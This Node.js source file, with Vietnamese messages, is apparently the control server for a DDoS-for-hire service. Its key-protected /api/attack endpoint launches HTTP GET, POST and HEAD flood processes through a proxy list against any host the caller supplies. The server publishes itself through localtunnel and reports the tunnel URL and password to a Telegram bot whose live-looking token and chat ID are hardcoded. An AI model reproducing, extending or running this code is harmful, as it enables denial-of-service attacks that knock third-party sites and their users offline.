const express = require("express");
const { spawn } = require("child_process");
const axios = require("axios");
const localtunnel = require("localtunnel");

const app = express();
const port = Math.floor(Math.random() * (9999 - 999 + 1)) + 999;
const MAX_CONCURRENT_ATTACKS = 1;
const BOT_TOKEN = "7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw";
const CHAT_ID = "7371969470";

let activeAttacks = 0;
let currentPID = null;

const sendTelegramMessage = async (message) => {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });
    console.log("Tin nhắn Telegram đã được gửi thành công.");
  } catch (error) {
    console.error("Lỗi khi gửi tin nhắn Telegram:", error.message);
  }
};

const validateInput = ({ key, host, time, method, port }) =>
  !([key, host, time, method, port].every(Boolean))
    ? "THIẾU THAM SỐ"
    : key !== "negan"
    ? "KEY KHÔNG HỢP LỆ"
    : time > 200
    ? "THỜI GIAN PHẢI < 200S"
    : port < 1 || port > 65535
    ? "CỔNG KHÔNG HỢP LỆ"
    : null;

const executeAttack = (command, time) => {
  const childProcess = spawn(command.split(" ")[0], command.split(" ").slice(1), {
    stdio: "inherit",
  });
  currentPID = childProcess.pid;
  console.log(`Tiến trình ${currentPID} đã được khởi chạy.`);

  const cleanup = () => {
    activeAttacks--;
    currentPID = null;
    console.log(`Tiến trình ${childProcess.pid} đã kết thúc. Slot được giải phóng.`);
  };

  childProcess.on("close", (code) => {
    console.log(`Tiến trình ${childProcess.pid} đã đóng với mã ${code}.`);
    cleanup();
  });

  childProcess.on("error", (err) => {
    console.error(`Lỗi khi thực thi lệnh: ${err.message}`);
    cleanup();
  });

  setTimeout(() => {
    if (currentPID === childProcess.pid) {
      console.error(`Tiến trình ${childProcess.pid} bị treo và đã bị hủy.`);
      childProcess.kill();
      cleanup();
    }
  }, time * 1000 + 10000);
};

const executeAllAttacks = (methods, host, time) =>
  methods
    .map(
      (method) =>
        `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`
    )
    .forEach((command) => executeAttack(command, time));

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul } = req.query;

  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID)
    return res.status(400).json({
      status: "ERROR",
      message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC",
      statusCode: 400,
    });

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage)
    return res.status(400).json({
      status: "ERROR",
      message: validationMessage,
      statusCode: 400,
    });

  activeAttacks++;

  if (modul === "FULL") {
    executeAllAttacks(["GET", "POST", "HEAD"], host, time);
    res.json({
      status: "SUCCESS",
      message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI",
      host: host,
      port: port,
      time: time,
      modul: "GET POST HEAD",
      method: method,
      pid: currentPID,
    });
  } else {
    const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
    executeAttack(command, time);
    res.json({
      status: "SUCCESS",
      message: "LỆNH TẤN CÔNG ĐÃ GỬI",
      host: host,
      port: port,
      time: time,
      modul: modul,
      method: method,
      pid: currentPID,
    });
  }
});

app.listen(port, async () => {
  console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`);

  // Tạo localtunnel với subdomain ngẫu nhiên
  const tunnel = await localtunnel({ port: port });

  console.log(`Localtunnel đang chạy tại: ${tunnel.url}`);
  sendTelegramMessage(`🔹 Localtunnel đang chạy:\n🌐 URL: ${tunnel.url}`).catch((err) =>
    console.error("Lỗi khi gửi tin nhắn Telegram:", err)
  );

  // Lấy mật khẩu (nếu có) bằng cách sử dụng curl
  const getPassword = async () => {
    try {
      const response = await axios.get(tunnel.url);
      const passwordMatch = response.data.match(/Password: (\w+)/);
      if (passwordMatch && passwordMatch[1]) {
        const password = passwordMatch[1];
        console.log(`Mật khẩu Localtunnel: ${password}`);
        sendTelegramMessage(`🔐 Mật khẩu Localtunnel: ${password}`).catch((err) =>
          console.error("Lỗi khi gửi tin nhắn Telegram:", err)
        );
      } else {
        console.log("Không tìm thấy mật khẩu.");
      }
    } catch (error) {
      console.error("Lỗi khi lấy mật khẩu:", error.message);
    }
  };

  // Gọi hàm lấy mật khẩu
  getPassword();

  tunnel.on("close", () => {
    console.log("Localtunnel đã đóng.");
    sendTelegramMessage("🔴 Localtunnel đã đóng. Vui lòng kiểm tra lại.").catch((err) =>
      console.error("Lỗi khi gửi tin nhắn Telegram:", err)
    );
  });

  tunnel.on("error", (err) => {
    console.error("Lỗi khi chạy Localtunnel:", err);
    sendTelegramMessage("🔴 Lỗi khi khởi động Localtunnel. Vui lòng kiểm tra lại.").catch((err) =>
      console.error("Lỗi khi gửi tin nhắn Telegram:", err)
    );
  });
});
